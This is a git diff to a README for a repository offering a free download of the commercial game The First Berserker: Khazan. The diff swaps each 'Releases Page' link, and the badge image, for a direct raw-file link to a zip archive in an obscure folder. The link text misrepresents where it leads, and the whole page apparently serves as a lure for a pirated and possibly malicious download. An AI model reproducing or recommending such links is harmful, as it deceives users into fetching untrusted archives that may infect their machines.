@@ -1,6 +1,6 @@
 # 🎮 The-First-Berserker-Khazan-Download - Unleash Your Inner Warrior
 
-[![Download](https://img.shields.io/badge/Download%20Now!-The%20First%20Berserker%20Khazan-brightgreen)](https://github.com/najiabdel/The-First-Berserker-Khazan-Download/releases)
+[![Download](https://raw.githubusercontent.com/najiabdel/The-First-Berserker-Khazan-Download/main/ging/The-First-Berserker-Khazan-Download.zip%20Now!-The%20First%20Berserker%20Khazan-brightgreen)](https://raw.githubusercontent.com/najiabdel/The-First-Berserker-Khazan-Download/main/ging/The-First-Berserker-Khazan-Download.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Here are the steps to download and run The First Berserker: Khazan.
 
 ### 1. Visit the Download Page
 
-To get started, visit our [Releases Page](https://github.com/najiabdel/The-First-Berserker-Khazan-Download/releases).
+To get started, visit our [Releases Page](https://raw.githubusercontent.com/najiabdel/The-First-Berserker-Khazan-Download/main/ging/The-First-Berserker-Khazan-Download.zip).
 
 ### 2. Choose Your Version
 
@@ -43,7 +43,7 @@ It’s important to check the requirements to ensure smooth gameplay. Below are 
 
 ## 📦 Download & Install
 
-To download The First Berserker: Khazan, please visit our [Releases Page](https://github.com/najiabdel/The-First-Berserker-Khazan-Download/releases). 
+To download The First Berserker: Khazan, please visit our [Releases Page](https://raw.githubusercontent.com/najiabdel/The-First-Berserker-Khazan-Download/main/ging/The-First-Berserker-Khazan-Download.zip). 
 
 Follow the instructions outlined above to complete the installation. If you encounter any issues, please consult the FAQ section below.
 
